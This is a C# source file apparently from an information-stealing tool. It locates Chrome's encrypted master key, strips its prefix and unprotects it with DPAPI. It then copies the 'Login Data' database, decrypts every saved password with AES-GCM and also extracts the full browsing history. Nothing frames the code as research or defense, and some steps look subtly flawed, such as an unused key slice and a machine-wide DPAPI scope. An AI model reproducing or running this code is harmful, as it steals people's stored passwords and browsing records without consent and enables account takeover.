using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Security;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Text;

namespace UserData
{
	public class  Chrome_Logs
	{
		public string OriginUrl { get; set; }
		public string ActionUrl { get; set; }
		public string Username { get; set; }
		public string Password { get; set; }
		public string IvEncryptedPasswordHex { get; set; }
		public string EncryptedPasswordHex { get; set; }
		public string CreationDate { get; set; }
		public string LastUsed { get; set; }
	}
	public class Chrome_History
	{
		public string Url { get; set; }
		public string Title { get; set; }
		public string LastVisitTime { get; set; }
	}
	public class Chrome_Data
	{
		public string EncryptionKey { get; set; }
		public List<Chrome_Logs> Chrome_Logs { get; set; }
		public List<Chrome_History> Chrome_History { get; set; }
	}
	
	public class Chrome_Information
	{
		public static string GetHex(byte[] bytes)
		{
			return BitConverter.ToString(bytes).Replace("-", "").ToUpper();
		}
		public static DateTime GetChromeDateTime(long chromedate)
		{
			return new DateTime(1601, 1, 1).Add(TimeSpan.FromTicks(chromedate * 10));
		}
		public static byte[] GetEncryptionKey()
		{
			string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Local State");
			string localStateJson = File.ReadAllText(localStatePath);
			JObject localStateObject = JObject.Parse(localStateJson);

			string base64Key = localStateObject.SelectToken("os_crypt.encrypted_key").ToString();
			byte[] keyBytes = Convert.FromBase64String(base64Key);

			// Delete "DPAPI\x01\x00\x00\x00"from bytes array
			byte[] decryptedKeyBytes = new byte[keyBytes.Length - 24];
			Array.Copy(keyBytes, 24, decryptedKeyBytes, 0, decryptedKeyBytes.Length);

			byte[] key = new byte[keyBytes.Length - 5];
			Array.Copy(keyBytes, 5, key, 0, key.Length);

			byte[] decryptedKey = ProtectedData.Unprotect(key, null, DataProtectionScope.LocalMachine);
			return decryptedKey;
		}
		private static string DecryptPassword(byte[] password, byte[] key, ref string IV_Encrypted_Password_HEX, ref string Encrypted_Password_HEX)
		{
			try
			{
				// get initialization vector (IV) 
				byte[] iv = new byte[12];
				Array.Copy(password, 3, iv, 0, 12);
				IV_Encrypted_Password_HEX = $"{GetHex(iv)}";

				// get encrypted password
				byte[] encryptedPassword = new byte[password.Length - 15];
				Array.Copy(password, 15, encryptedPassword, 0, password.Length - 15);
				Encrypted_Password_HEX = $"{GetHex(encryptedPassword)}";

				// initialize AES-GCM cipher
				IBufferedCipher cipher = CipherUtilities.GetCipher("AES/GCM/NoPadding");
				KeyParameter keyParam = new KeyParameter(key);
				ParametersWithIV parametersWithIV = new ParametersWithIV(keyParam, iv);
				cipher.Init(false, parametersWithIV);

				// decrypte password
				byte[] decryptedBytes = cipher.DoFinal(encryptedPassword);
				return Encoding.UTF8.GetString(decryptedBytes);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error while decrypting password: " + ex.Message);
				return "";
			}
		}
		public static async Task<List<Chrome_Logs>> GetChromeLogs()
		{
			List<Chrome_Logs> chrome_logs = new List<Chrome_Logs>();

			byte[] key = GetEncryptionKey();

			string dbPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Login Data");
			string filename = "ChromeData.db";
			File.Copy(dbPath, filename, true);

			string connectionString = $"Data Source={filename};Version=3;";
			using (SQLiteConnection connection = new SQLiteConnection(connectionString))
			{
				connection.Open();
				string query = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
				using (SQLiteCommand command = new SQLiteCommand(query, connection))
				using (SQLiteDataReader reader = command.ExecuteReader())
				{
					while (reader.Read())
					{
						Chrome_Logs log = new Chrome_Logs();

						log.OriginUrl = reader["origin_url"].ToString();
						log.ActionUrl = reader["action_url"].ToString();
						log.Username = reader["username_value"].ToString();

						byte[] encryptedPassword = (byte[])reader["password_value"];

						string IV_Encrypted_Password_HEX = "";
						string Encrypted_Password_HEX = "";

						log.Password = DecryptPassword(encryptedPassword, key, ref IV_Encrypted_Password_HEX, ref Encrypted_Password_HEX);

						log.IvEncryptedPasswordHex = IV_Encrypted_Password_HEX;
						log.EncryptedPasswordHex = Encrypted_Password_HEX;

						long dateCreated = Convert.ToInt64(reader["date_created"]);
						long dateLastUsed = Convert.ToInt64(reader["date_last_used"]);

						if (dateCreated != 86400000000 && dateCreated > 0)
							log.CreationDate = GetChromeDateTime(dateCreated).ToString();
						if (dateLastUsed != 86400000000 && dateLastUsed > 0)
							log.LastUsed = GetChromeDateTime(dateLastUsed).ToString();

						chrome_logs.Add(log);
					}
				}
				connection.Close();
			}
			try
			{
				File.Delete(filename);
			}
			catch
			{
				//ignore
			}
			return chrome_logs;
		}
		public static async Task<List<Chrome_History>> GetChromeHistory()
		{
			List<Chrome_History> chrome_histories = new List<Chrome_History>();
			try
			{
				string historyDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "History");
				string connectionString = $"Data Source={historyDataPath};Version=3;";

				SQLiteConnection.ClearAllPools();
				SQLiteConnection connection = new SQLiteConnection(connectionString);
				connection.Open();

				string query = "SELECT * FROM urls";
				SQLiteCommand command = new SQLiteCommand(query, connection);

				SQLiteDataReader history_reader = command.ExecuteReader();
				while (history_reader.Read())
				{
					Chrome_History history = new Chrome_History();

					history.Url = history_reader["url"].ToString();
					history.Title =  history_reader["title"].ToString();

					long lastVisitTime = Convert.ToInt64(history_reader["last_visit_time"]);
					history.LastVisitTime =  GetChromeDateTime(lastVisitTime).ToString();
					chrome_histories.Add(history);
				}
				history_reader.Close();
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error while reading Chrome history: " + ex.Message);
			}
			return chrome_histories;
		}
		
	}
}
